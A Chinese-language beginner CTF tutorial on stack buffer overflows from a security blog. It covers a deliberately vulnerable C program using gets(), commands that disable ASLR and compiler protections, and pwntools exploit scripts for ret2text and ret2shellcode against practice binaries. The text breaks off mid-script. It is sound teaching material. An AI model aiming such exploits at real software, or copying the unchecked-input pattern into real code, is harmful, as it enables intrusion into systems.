---
title: Pwn入门之基础栈溢出
url: https://www.secpulse.com/archives/192491.html
source: 安全脉搏
date: 2022-11-30
fetch_date: 2025-10-04T00:03:40.337896
---

# Pwn入门之基础栈溢出

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# Pwn入门之基础栈溢出

[CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)

[TideSec](https://www.secpulse.com/newpage/author?author_id=26366)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-11-29

15,784

# 前言

众所周知CTF中最难入门最难进阶的当属Pwn，本文将从一个小白的角度讲解CTF中最基础的栈溢出。

# 栈溢出原理

程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss段溢出等溢出方式。

发生的前提条件

* • 程序必须向栈上写入数据
* • 写入的数据大小没有被良好地控制

## 简单示例

```
#include <stdio.h>
#include <string.h>
void success() { puts("You Hava already controlled it."); }
void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```

我们所要达成的目的是让程序执行success函数

首先关闭ASLR

```
echo 0 > /proc/sys/kernel/randomize_va_space
```

使用如下指令进行编译

```
gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example
```

得到一个`stack_example`文件，使用checksec进行分析

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-1669700396.png "null")

反编译一下二进制程序并查看vulnerable函数

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-16697003961.png "null")

分析其对应的栈结构，字符串s距离ebp的长度为0x14，那么对应的栈结构应该如下图所示

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-1669700397.png "null")

使用IDA分析，获得success的地址，其地址为0x08048456

ps:这里的success的地址不是固定的，需要根据个人情况进行分析

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-1669700398.png "null")

于是构造如下payload

```
0x14*'a' +  'bbbb' + success_addr
```

此时的栈结构如下

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-1669700400.png "null")

这里需要注意的是，在计算机内存中，每个值都是按照字节存储的，一般情况下都是采用小端存储，即0x08048456在内存中的形式是

```
x56x84x04x08
```

但是如果我们直接输入的话又会按照字符串进行处理，于是这里我们使用pwntools来帮我们完成复杂的操作，于是构造exp如下

```
# coding=utf-8
from pwn import *
# 构造交互对象
p = process('./stack_example')
# success函数地址
success_addr = 0x08048456
# 构造payload
payload = 'a'*0x14 + 'bbbb' + p32(success_addr)
# 向程序发送字符串
p.sendline(payload)
# 将代码交互改为手动交互
p.interactive()
```

得到如下结果证明我们成功了

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-1669700402.png "null")

## 简单栈溢出总结

* • 寻找危险函数

+ • 输入
+ • 输出
+ • 字符串
+ • gets，直接读取一行，忽略'x00'
+ • scanf
+ • vscanf
+ • sprintf
+ • strncpy，字符串拼接，遇到'x00'停止
+ • strcat，字符串拼接，遇到'x00'停止
+ • bcopy
+ • 寻找危险函数，快速确定程序是否可能有栈溢出，如果有的话，位置在哪
+ • 常见危险函数

* • 确定填充长度

+ • 覆盖函数返回地址，这时直接查看ebp即可
+ • 覆盖栈上某个变量的内容，需要进一步计算
+ • 覆盖bss段某个变量的内容
+ • 根据实际情况，覆盖特定的变量或地址的内容
+ • 相对于栈基地址的索引，可以直接通过查看EBP相对偏移量获得
+ • 相对应栈顶指针的索引，一般需要进行调试，之后还会转到第一种类型
+ • 直接地址索引，就相当于直接给定了地址
+ • 计算我们所要操作的地址与我们所要覆盖的地址的距离，常见的操作方法是利用IDA，根据其给定的地址计算偏移量。一般变量会有以下几种索引模式。
+ • 一般来说，会有如下覆盖要求
+ • 之所以要覆盖某个地址，是因为想通过覆盖地址的方法来直接或间接地控制程序执行流程。

# 基本ROP

由于NX保护的存在，导致直接往栈或者堆上直接注入代码的方式难以发挥效果。攻击者们提出了相应的方法来绕过保护，目前主要是ROP（Return Oriented Programming），主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段（gadgets）来改变某些寄存器或者变量的值，从而控制程序的执行流程。

gadgets是以ret结尾的指令序列，通过这个指令序列可以修改某些地址的内容，方便控制程序的执行流程。

之所以称之为ROP，是因为核心在于利用了指令集中的ret指令，改变了指令流的执行顺序，ROP的攻击前提是满足如下条件

* • 程序存在溢出，并且可以控制返回地址。
* • 可以找到满足条件的gadgest以及相应gadgets的地址。

## ret2text

控制程序执行程序本身已有的代码(.text)。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。

这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，需要想办法去绕过这些保护。

例子：https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text

查看程序

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-1669700405.png "null")

32位程序，仅开启了栈不可以执行保护，分析源码

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-1669700406.png "null")

程序在主函数中，使用了gets函数，明显存在栈溢出，分析字符串发现系统中有/bin/sh字样

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-1669700407.png "null")

跟进分析，查找调用`/bin/sh`的地址

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-1669700409.png "null")

分析发现调用`/bin/sh`的地址为`0x0804863A`，直接控制系统返回至此，就可以得到系统的shell。

接下来考虑构造payload，首先需要确定能够控制的内存的起始地址距离main函数的返回地址的字节数

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-1669700411.png)

通过分析发现该字符串是通过esp进行索引的，所以需要进行调试，把断点下在call处，查看esp，ebp

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-16697004111.png "null")

esp为`0xffffd410`，ebp为`0xffffd498`，同时s相对于esp的索引为`esp+0x80`，因此可以推断

* • s的地址为`0xffffd42c`
* • s相对于ebp的偏移为`0x6c`
* • s相对于返回地址的偏移为`0x6c+4`

构造最终payload

```
from pwn import *
p = process('./ret2text')
target = 0x0804863A
payload = 'A'*0x6c+'B'*4+p32(target)
p.sendline(payload)
p.interactive()
```

## ret2shellcode

控制程序执行shellcode代码。在栈溢出的基础上，要想执行shellcode，需要对应的binary在运行时，shellcode所在的区域具有可执行权限权限

例子

首先使用checksec查看一下程序

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-1669700413.png "null")

分析发现程序为32程序，且没有开启任何保护

放进ida中进行分析

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-1669700415.png "null")

分析发现存在strncpy函数，使用文本视图查看call调用srncpy的位置

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-1669700417.png "null")

gdb调试时，在此处下断点

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-1669700419.png "null")

分析发现输入的字符串的地址是`0xffffcf3c`，`ebp`的地址是`0xffffcfa8`，偏移量为`0x6C+4`

继续分析发现程序会将对应的字符串复制到buf2处。进行分析可知buf2在bss段，在main处打断点调试程序，使用`vmmap`查看分析发现这一个bss段可执行

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192491-1669700423.png "null")

所以最后的exp如下

```
from pwn import *
p = process('ret...